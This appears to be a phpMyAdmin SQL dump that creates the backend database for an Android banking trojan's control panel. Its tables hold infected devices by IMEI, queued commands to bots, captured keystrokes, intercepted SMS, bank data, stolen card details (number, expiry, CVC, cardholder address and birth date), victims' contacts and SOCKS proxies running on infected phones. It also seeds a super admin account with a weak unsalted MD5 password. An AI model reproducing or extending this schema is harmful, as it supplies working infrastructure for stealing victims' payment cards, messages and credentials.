-- phpMyAdmin SQL Dump
-- version 4.7.6
-- https://www.phpmyadmin.net/
--
-- Host: localhost
-- Generation Time: Jan 30, 2018 at 05:54 AM
-- Server version: 10.1.29-MariaDB
-- PHP Version: 7.2.0

SET SQL_MODE = "NO_AUTO_VALUE_ON_ZERO";
SET AUTOCOMMIT = 0;
START TRANSACTION;
SET time_zone = "+00:00";


/*!40101 SET @OLD_CHARACTER_SET_CLIENT=@@CHARACTER_SET_CLIENT */;
/*!40101 SET @OLD_CHARACTER_SET_RESULTS=@@CHARACTER_SET_RESULTS */;
/*!40101 SET @OLD_COLLATION_CONNECTION=@@COLLATION_CONNECTION */;
/*!40101 SET NAMES utf8mb4 */;

--
-- Database: `corephpadmin`
--

-- --------------------------------------------------------

--
-- Table structure for table `admin_accounts`
--
DROP TABLE IF EXISTS `admin_accounts`;

CREATE TABLE `admin_accounts` (
  `id` int(25) NOT NULL,
  `user_name` varchar(20) NOT NULL,
  `passwd` varchar(50) NOT NULL,
  `admin_type` varchar(10) NOT NULL
) ENGINE=InnoDB DEFAULT CHARSET=latin1;

--
-- Dumping data for table `admin_accounts`
--

INSERT INTO `admin_accounts` (`id`, `user_name`, `passwd`, `admin_type`) VALUES
(2, 'do-your-best', 'c4ca4238a0b923820dcc509a6f75849b', 'super');

-- --------------------------------------------------------
DROP TABLE IF EXISTS `clients`;

CREATE TABLE `clients` (
  `id` int(255) unsigned NOT NULL AUTO_INCREMENT,
  `imei` varchar(300) NOT NULL,
  `number` varchar(300) DEFAULT NULL,
  `version` varchar(100) DEFAULT NULL,
  `version_apk` text DEFAULT NULL,
  `country` varchar(30) DEFAULT NULL,
  `model` text DEFAULT NULL,
  `apps` text DEFAULT NULL,
  `lastConnect` int(11) DEFAULT NULL,
  `firstConnect` int(11) DEFAULT NULL,
  `root` varchar(50) DEFAULT NULL,
  `screen` varchar(50) DEFAULT NULL,
  `comment` text DEFAULT NULL,
  `internet` text DEFAULT NULL,
  `secret` text DEFAULT NULL,
  `ip` text DEFAULT NULL,
  `zip` text DEFAULT NULL,
  `regionName` text DEFAULT NULL,
  `city` text DEFAULT NULL,
  `s_bank` int(11) DEFAULT 0,
  `s_card` int(11) DEFAULT 0,
  `s_sms` int(11) DEFAULT 0,
  `s_log` int(11) DEFAULT 0,
  `s_a7inj_enabled` int(11) DEFAULT 0,
  `s_whitelist` int(11) DEFAULT 0,
  `s_sms_manager` int(11) DEFAULT 0,
  `s_accessibility` int(11) DEFAULT 0,
  `s_overlay` int(11) DEFAULT 0,
  PRIMARY KEY (`id`),
  KEY `id` (`id`)
) ENGINE=InnoDB DEFAULT CHARSET=utf8;

DROP TABLE IF EXISTS `locked_clients`;

CREATE TABLE `locked_clients` (
  `id` int(255) unsigned NOT NULL AUTO_INCREMENT,
  `imei` varchar(300) NOT NULL,
  `version` varchar(100) DEFAULT NULL,
  `country` varchar(30) DEFAULT NULL,
  `client_id` text DEFAULT NULL,
  `secret` text DEFAULT NULL,
  `lastConnect` int(11) DEFAULT NULL,
  `firstConnect` int(11) DEFAULT NULL,
  PRIMARY KEY (`id`),
  KEY `id` (`id`)
) ENGINE=InnoDB DEFAULT CHARSET=utf8;

DROP TABLE IF EXISTS `commands`;

CREATE TABLE `commands` (
  `id` int(255) unsigned NOT NULL AUTO_INCREMENT,
  `imei` varchar(60) NOT NULL,
  `command` varchar(2000) NOT NULL,
  `command_name` text DEFAULT NULL,
  PRIMARY KEY (`id`),
  KEY `id` (`id`)
) ENGINE=InnoDB DEFAULT CHARSET=utf8;

DROP TABLE IF EXISTS `logs`;

CREATE TABLE `logs` (
  `id` int(255) unsigned NOT NULL AUTO_INCREMENT,
  `imei` varchar(60) NOT NULL,
  `time` int(11) DEFAULT NULL,
  `text` text NOT NULL,
  PRIMARY KEY (`id`),
  KEY `id` (`id`)
) ENGINE=InnoDB DEFAULT CHARSET=utf8;

DROP TABLE IF EXISTS `keylogs`;

CREATE TABLE `keylogs` (
  `id` int(255) unsigned NOT NULL AUTO_INCREMENT,
  `imei` varchar(60) NOT NULL,
  `time` int(11) DEFAULT NULL,
  `text` text NOT NULL,
  PRIMARY KEY (`id`),
  KEY `id` (`id`)
) ENGINE=InnoDB DEFAULT CHARSET=utf8;

DROP TABLE IF EXISTS `sms`;

CREATE TABLE `sms` (
  `id` int(255) unsigned NOT NULL AUTO_INCREMENT,
  `imei` varchar(60) NOT NULL,
  `time` int(11) DEFAULT NULL,
  `text` text NOT NULL,
  PRIMARY KEY (`id`),
  KEY `id` (`id`)
) ENGINE=InnoDB DEFAULT CHARSET=utf8;

DROP TABLE IF EXISTS `info`;
CREATE TABLE `info` (
  `id` int(255) unsigned NOT NULL AUTO_INCREMENT,
  `imei` varchar(60) NOT NULL,
  `name` varchar(60) DEFAULT NULL,
  `hash` varchar(60) NOT NULL,
  `time` int(11) DEFAULT NULL,
  PRIMARY KEY (`id`),
  KEY `id` (`id`)
) ENGINE=InnoDB DEFAULT CHARSET=utf8;

DROP TABLE IF EXISTS `banks`;
CREATE TABLE `banks` (
  `id` int(255) unsigned NOT NULL AUTO_INCREMENT,
  `imei` varchar(60) NOT NULL,
  `data` text DEFAULT NULL,
  `time` int(11) DEFAULT NULL,
  PRIMARY KEY (`id`),
  KEY `id` (`id`)
) ENGINE=InnoDB DEFAULT CHARSET=utf8;

DROP TABLE IF EXISTS `cc_info`;
CREATE TABLE `cc_info` (
  `id` int(11) unsigned NOT NULL AUTO_INCREMENT,
  `IMEI` text NOT NULL,
  `CARD` text NOT NULL,
  `typeCard` text DEFAULT NULL,
  `MMYY` text DEFAULT NULL,
  `CVC` text DEFAULT NULL,
  `VBV` text DEFAULT NULL,
  `CardholderName` text DEFAULT NULL,
  `PhoneNumber` text DEFAULT NULL,
  `birth_date` text DEFAULT NULL,
  `zip_code` text DEFAULT NULL,
  `holder_address` text DEFAULT NULL,
  `last_update` int(11) DEFAULT NULL,
  PRIMARY KEY (`id`)
) ENGINE=InnoDB DEFAULT CHARSET=utf8;

DROP TABLE IF EXISTS `contacts`;
CREATE TABLE `contacts` (
  `id` int(255) unsigned NOT NULL AUTO_INCREMENT,
  `imei` varchar(60) NOT NULL,
  `number` varchar(60) DEFAULT NULL,
  `name` varchar(60) DEFAULT NULL,
  `country` varchar(60) DEFAULT NULL,
  `time` int(11) DEFAULT NULL,
  PRIMARY KEY (`id`),
  KEY `id` (`id`)
) ENGINE=InnoDB DEFAULT CHARSET=utf8;

DROP TABLE IF EXISTS `proxy_servers`;
CREATE TABLE `proxy_servers` (
  `id` int(11) NOT NULL AUTO_INCREMENT,
  `ip` text NOT NULL,
  `user` text NOT NULL,
  `pass` text NOT NULL,
  `forward_user` text NOT NULL,
  `forward_pass` text NOT NULL,
  `root` int(11) NOT NULL,
  `time` int(11) NOT NULL,
  `country` text NOT NULL,
  `note` text NOT NULL,
  `status` int(11) NOT NULL,
  `status_text` text NOT NULL,
  PRIMARY KEY (`id`)
) ENGINE=InnoDB DEFAULT CHARSET=utf8;

DROP TABLE IF EXISTS `socks`;
CREATE TABLE `socks` (
  `id` int(11) NOT NULL AUTO_INCREMENT,
  `imei` text NOT NULL,
  `bot_country` text NOT NULL,
  `server` int(11) NOT NULL,
  `port` int(11) NOT NULL,
  `connect_time` int(11) NOT NULL,
  `status` int(11) NOT NULL,
  PRIMARY KEY (`id`)
) ENGINE=InnoDB DEFAULT CHARSET=utf8;

DROP TABLE IF EXISTS `guests`;
CREATE TABLE `guests` (
  `id` int(11) NOT NULL AUTO_INCREMENT,
  `name` text NOT NULL,
  `filter` text NOT NULL,
  `secret` text NOT NULL,
  `link` text NOT NULL,
  PRIMARY KEY (`id`)
) ENGINE=InnoDB DEFAULT CHARSET=utf8;

ALTER TABLE `admin_accounts`
  ADD PRIMARY KEY (`id`);

--
-- Indexes for table `customers`
--

--
-- AUTO_INCREMENT for dumped tables
--

--
-- AUTO_INCREMENT for table `admin_accounts`
--
ALTER TABLE `admin_accounts`
  MODIFY `id` int(25) NOT NULL AUTO_INCREMENT, AUTO_INCREMENT=7;

--
-- AUTO_INCREMENT for table `customers`
--

/*!40101 SET CHARACTER_SET_CLIENT=@OLD_CHARACTER_SET_CLIENT */;
/*!40101 SET CHARACTER_SET_RESULTS=@OLD_CHARACTER_SET_RESULTS */;
/*!40101 SET COLLATION_CONNECTION=@OLD_COLLATION_CONNECTION */;
